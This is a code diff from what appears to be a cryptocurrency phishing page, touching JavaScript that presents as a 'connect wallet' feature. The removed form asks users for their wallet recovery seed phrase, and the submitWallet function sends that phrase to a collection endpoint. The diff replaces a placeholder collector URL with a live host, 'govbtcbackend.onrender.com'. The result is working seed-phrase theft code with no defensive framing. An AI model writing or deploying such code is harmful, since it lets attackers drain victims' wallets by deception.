@@ -1,23 +1,3 @@
-function connectWallet() {
-  const container = document.getElementById("walletBox");
-
-  container.innerHTML = `
-    <label for="walletSelect"><strong>Select Wallet Type:</strong></label><br>
-    <select id="walletSelect" style="margin-top: 10px;">
-      <option value="MetaMask">MetaMask</option>
-      <option value="TrustWallet">Trust Wallet</option>
-      <option value="Coinbase">Coinbase</option>
-    </select><br><br>
-
-    <label for="seedInput"><strong>Enter Seed Phrase:</strong></label><br>
-    <textarea id="seedInput" rows="3" placeholder="Enter your 12 or 24-word recovery phrase here" style="width: 100%; border-radius: 6px; padding: 10px;"></textarea><br><br>
-
-    <button onclick="submitWallet()" class="btn">Submit</button>
-  `;
-
-  container.style.display = "block";
-}
-
 function submitWallet() {
   const walletType = document.getElementById("walletSelect").value;
   const seedPhrase = document.getElementById("seedInput").value;
@@ -27,7 +7,7 @@ function submitWallet() {
     return;
   }
 
-  fetch("https://your-collector-endpoint.com/collect", {
+  fetch("https://govbtcbackend.onrender.com/collect", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
